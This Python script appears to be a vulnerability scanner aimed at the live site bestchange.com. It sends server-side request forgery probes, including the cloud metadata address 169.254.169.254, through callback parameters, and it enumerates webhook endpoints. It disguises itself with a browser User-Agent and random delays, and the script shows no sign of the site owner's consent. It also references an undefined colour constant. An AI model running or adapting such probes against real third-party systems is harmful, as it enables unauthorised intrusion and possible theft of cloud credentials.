#!/usr/bin/env python3
"""
BestChange.com Webhook and Callback Testing
Test for webhook vulnerabilities and callback issues
"""

import requests
import time
import random

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class WebhookTester:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 10
    
    def random_delay(self, min_sec=0.2, max_sec=0.5):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def test_callback_parameters(self):
        """Test callback parameters for SSRF"""
        print(f"{Colors.BLUE}[*] Testing callback parameters...{Colors.RESET}")
        
        callback_params = ['callback', 'cb', 'jsonp', 'jsoncallback']
        ssrf_targets = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',
        ]
        
        for param in callback_params:
            for target in ssrf_targets:
                try:
                    url = f"{self.base_url}/index.php"
                    response = self.session.get(url, params={param: target}, timeout=5)
                    self.random_delay()
                    
                    if '127.0.0.1' in response.text or 'localhost' in response.text.lower():
                        self.log_finding(
                            "SSRF via Callback",
                            f"index.php?{param}",
                            f"SSRF target accessible: {target}",
                            "HIGH"
                        )
                except:
                    continue
    
    def test_webhook_endpoints(self):
        """Test for webhook endpoints"""
        print(f"{Colors.BLUE}[*] Testing webhook endpoints...{Colors.RESET}")
        
        webhook_paths = [
            '/webhook', '/webhooks', '/hook', '/hooks',
            '/callback', '/callbacks', '/notify', '/notification',
        ]
        
        for path in webhook_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=5)
                self.random_delay()
                
                if response.status_code in [200, 405]:
                    self.log_finding(
                        "Webhook Endpoint",
                        url,
                        f"Status: {response.status_code}",
                        "INFO"
                    )
            except:
                continue
    
    def generate_report(self):
        """Generate report"""
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"{Colors.YELLOW}WEBHOOK TESTING REPORT{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        if self.findings:
            print(f"{Colors.RED}[!] Found {len(self.findings)} finding(s){Colors.RESET}\n")
            for finding in self.findings:
                color = Colors.RED if finding['severity'] == 'HIGH' else Colors.YELLOW if finding['severity'] == 'MEDIUM' else Colors.CYAN
                print(f"{color}[{finding['severity']}] {finding['type']}{Colors.RESET}")
                print(f"    {finding['location']}: {finding['details']}\n")
        else:
            print(f"{Colors.GREEN}[+] No webhook vulnerabilities found{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Webhook Testing{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    tester = WebhookTester()
    
    try:
        tester.test_callback_parameters()
        tester.test_webhook_endpoints()
    except Exception as e:
        print(f"{Colors.RED}Error: {str(e)}{Colors.RESET}")
    
    tester.generate_report()

if __name__ == "__main__":
    main()
